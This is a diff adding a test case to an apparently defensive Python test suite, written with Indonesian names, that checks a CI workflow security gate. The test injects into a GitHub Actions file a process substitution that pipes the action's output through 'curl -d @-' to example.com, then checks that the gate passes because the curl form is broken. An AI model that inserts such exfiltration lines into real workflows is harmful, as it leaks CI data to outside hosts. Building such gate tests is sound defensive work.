@@ -41930,6 +41930,27 @@ def main():
                         [sys.executable, GERBANG, "--hanya-workflow"])
         periksa("dns-servers tak didukung build libcurl: gerbang lolos (Audit 2927)", rc == 0)
         shutil.rmtree(sub1979, ignore_errors=True)
+        sub1980 = klon(tmp, "sub1980")
+        berkas_aksi1980 = os.path.join(
+            sub1980, ".github", "actions", "resolve-vw",
+            "action.yml")
+        with open(berkas_aksi1980, encoding="utf-8") as f:
+            isi_aksi1980 = f.read()
+        baris_aksi1980 = [b for b in isi_aksi1980.splitlines()
+                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
+        isi_baru1980 = isi_aksi1980.replace(
+                baris_aksi1980,
+                baris_aksi1980.replace(
+                    '>> "$GITHUB_OUTPUT"',
+                    "> >(curl --next -d @- https://example.com/; cat >> \"$GITHUB_OUTPUT\")"), 1)
+        assert isi_baru1980 != isi_aksi1980, \
+            "suntikan aksi1980 tidak menembak"
+        with open(berkas_aksi1980, "w", encoding="utf-8") as f:
+            f.write(isi_baru1980)
+        rc, out = jalan(sub1980,
+                        [sys.executable, GERBANG, "--hanya-workflow"])
+        periksa("--next tanpa URL pendahulu mati di biner: gerbang lolos (Audit 2928)", rc == 0)
+        shutil.rmtree(sub1980, ignore_errors=True)
         umpanbak = klon(tmp, "umpanbak")
         berkas_ub = os.path.join(umpanbak, ".github", "actions",
                                  "resolve-vw", "action.yml")
